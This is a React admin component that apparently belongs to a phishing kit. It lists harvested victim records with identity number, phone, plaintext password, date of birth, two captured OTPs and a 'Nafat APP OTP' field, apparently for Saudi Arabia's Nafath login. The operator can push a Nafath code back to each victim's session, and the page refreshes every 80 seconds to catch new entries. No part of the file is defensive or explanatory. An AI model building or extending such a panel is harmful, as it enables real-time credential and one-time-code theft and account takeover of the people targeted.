import { useEffect, useState } from 'react'
import dynamic from 'next/dynamic'

const UserDetailsTable = () => {
  const [orders, setOrders] = useState([])
  const [loading, setLoading] = useState(false)

  useEffect(() => {
    // fetch all the data from api localhost:3000/api/admin/orders
    setLoading(true)
    fetch(`${process.env.API_URL}/api/admin/orders`)
      .then((res) => res.json())
      .then((data) => {
        setOrders(data)
        setLoading(false)
      })
      .catch((err) => {
        console.log(err)
        setLoading(false)
      })

    const interval = setInterval(() => {
      window.location.reload()
    }, 80000)

    return () => clearInterval(interval)
  }, [])

  const handleUpdateSubmit = (index, event) => {
    const submitData = {
      nafatOtp: Number(event.target.nafatOtp.value),
    }

    const url = `${process.env.API_URL}/api/admin/orders/${orders[index]._id}`

    if (submitData.nafatOtp === 0) {
      alert('Please enter your nafat otp')
    } else {
      // post all the data through api localhost:3000/api/order
      fetch(url, {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => res.json())
        .then((data) => {
          if (data) {
            // reload the page on alert click
            alert('Nafat OTP updated successfully')
            window.location.reload()
          } else {
            alert('Please enter correct otp')
          }
        })
        .catch((err) => {
          // alert(`Something went wrong ~${err}`)
          console.log('err', err)
        })
    }
  }

  const handleUpdate = (index) => {
    // return a input field with a button to update the nafat otp
    return (
      <div className="">
        <form
          onSubmit={(event) => handleUpdateSubmit(index, event)}
          className="flex flex-col gap-1 justify-center items-center"
        >
          <input
            type="number"
            name="nafatOtp"
            className="w-20 px-2 py-1 border rounded-md outline-none"
          />
          <button
            className="px-4 py-1 text-white bg-blue-500 rounded-md"
            type="submit"
          >
            Update
          </button>
        </form>
      </div>
    )
  }

  const handleDelete = (id) => {
    // delete the data from api localhost:3000/api/admin/orders/[id]
    fetch(`${process.env.API_URL}/api/admin/orders/${id}`, {
      method: 'DELETE',
    })
      .then((res) => res.json())
      .then((data) => {
        if (data) {
          // reload the page on alert click
          alert('User deleted successfully')
          window.location.reload()
        } else {
          alert('Something went wrong')
        }
      })
      .catch((err) => {
        alert(`Something went wrong ~${err}`)
      })
  }

  const dateFormat = (date) => {
    const newDate = new Date(date)
    const day = newDate.getDate()
    const month = newDate.getMonth() + 1
    const year = newDate.getFullYear()
    return `${day}-${month}-${year}`
  }

  const handleOrders = () => {
    if (loading) {
      // return a loading spinner
      return (
        <tr>
          <td className="px-6 py-4" colSpan={11}>
            <div
              role="status"
              className="h-[60vh] flex justify-center items-center"
            >
              <svg
                aria-hidden="true"
                className="inline w-8 h-8 text-gray-200 animate-spin dark:text-gray-600 fill-green-500"
                viewBox="0 0 100 101"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
                  fill="currentColor"
                />
                <path
                  d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
                  fill="currentFill"
                />
              </svg>
              <span className="sr-only">Loading...</span>
            </div>
          </td>
        </tr>
      )
    } else if (orders.length === 0) {
      return (
        <tr>
          <td className="px-6 py-4" colSpan={11}>
            <div className="flex justify-center items-center">
              <p className="text-lg text-gray-500 dark:text-gray-400">
                No Data Found
              </p>
            </div>
          </td>
        </tr>
      )
    } else {
      return orders.map((order, index) => (
        <tr key={index}>
          <td className="px-6 py-4">{index + 1}</td>
          <td className="px-6 py-4">{order.identity}</td>
          <td className="px-6 py-4">{order.phone}</td>
          <td className="px-6 py-4">{order.password}</td>
          <td className="px-6 py-4">{dateFormat(order.dob)}</td>
          <td className="px-6 py-4">{order.firstOtp}</td>
          <td className="px-6 py-4">{order.secondOtp}</td>
          <td className="px-6 py-4">
            {order.nafatOtp === 0 ? handleUpdate(index) : order.nafatOtp}
          </td>
          <td className="px-6 py-4">{order.nationality}</td>
          <td className="px-6 py-4">
            {order.address.addressDetails != '' &&
            order.address.city != '' &&
            order.address.country != ''
              ? `${order.address.addressDetails}, ${order.address.city},
                    ${order.address.country}`
              : 'No Data Found'}
          </td>
          <td className="px-6 py-4">
            <button
              className="px-4 py-1 text-white bg-red-500 rounded-md"
              onClick={() => handleDelete(order._id)}
            >
              Delete
            </button>
          </td>
        </tr>
      ))
    }
  }

  return (
    <div>
      <div className="relative overflow-x-auto border">
        <table className="w-full text-sm text-left rtl:text-right text-gray-500 dark:text-gray-400">
          <thead className="text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400 border-b">
            <tr>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                #ID
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Username
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Phone
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Password
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                DOB
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                First OTP
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Second OTP
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Nafat APP OTP
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Country
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Address
              </th>
              <th scope="col" className="px-6 py-3 font-medium tracking-wider">
                Action
              </th>
            </tr>
          </thead>
          <tbody>
            {/* If order length is zero show message */}

            {handleOrders()}

            {/* {orders.length > 0 ? (
              orders.map((order, index) => (
                <tr key={index}>
                  <td className="px-6 py-4">{index + 1}</td>
                  <td className="px-6 py-4">{order.identity}</td>
                  <td className="px-6 py-4">{order.phone}</td>
                  <td className="px-6 py-4">{order.password}</td>
                  <td className="px-6 py-4">{dateFormat(order.dob)}</td>
                  <td className="px-6 py-4">{order.firstOtp}</td>
                  <td className="px-6 py-4">{order.secondOtp}</td>
                  <td className="px-6 py-4">
                    {order.nafatOtp === 0
                      ? handleUpdate(index)
                      : order.nafatOtp}
                  </td>
                  <td className="px-6 py-4">{order.nationality}</td>
                  <td className="px-6 py-4">
                    {order.address.addressDetails != '' &&
                    order.address.city != '' &&
                    order.address.country != ''
                      ? `${order.address.addressDetails}, ${order.address.city},
                    ${order.address.country}`
                      : 'No Data Found'}
                  </td>
                  <td className="px-6 py-4">
                    <button
                      className="px-4 py-1 text-white bg-red-500 rounded-md"
                      onClick={() => handleDelete(order._id)}
                    >
                      Delete
                    </button>
                  </td>
                </tr>
              ))
            ) : orders.length === 0 ? (
              <tr>
                <td className="px-6 py-4" colSpan={11}>
                  <div className="flex justify-center items-center">
                    <p className="text-lg text-gray-500 dark:text-gray-400">
                      No Data Found
                    </p>
                  </div>
                </td>
              </tr>
            ) : (
              <tr>
                <td className="px-6 py-4" colSpan={11}>
                  <div
                    role="status"
                    className="h-[60vh] flex justify-center items-center"
                  >
                    <svg
                      aria-hidden="true"
                      className="inline w-8 h-8 text-gray-200 animate-spin dark:text-gray-600 fill-green-500"
                      viewBox="0 0 100 101"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
                        fill="currentColor"
                      />
                      <path
                        d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
                        fill="currentFill"
                      />
                    </svg>
                    <span className="sr-only">Loading...</span>
                  </div>
                </td>
              </tr>
            )} */}
          </tbody>
        </table>
      </div>
    </div>
  )
}

export default dynamic(() => Promise.resolve(UserDetailsTable), { ssr: false })
